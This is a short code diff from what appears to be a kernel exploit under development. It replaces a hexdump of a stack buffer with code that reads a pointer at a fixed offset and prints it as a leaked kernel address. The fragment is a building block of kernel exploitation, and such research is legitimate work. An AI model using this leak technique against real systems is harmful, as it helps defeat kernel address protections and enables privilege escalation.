@@ -88,7 +88,9 @@ int main()
         NULL
     );
 
-    hexdump(stack_value + 0x100, 600);
+    uintptr_t leak_kernel = (uintptr_t)*(void **)(stack_value + 0x108);
+
+    printf("[!] Leak Kernel: 0x%llx",leak_kernel);
 
     return 0;
 }
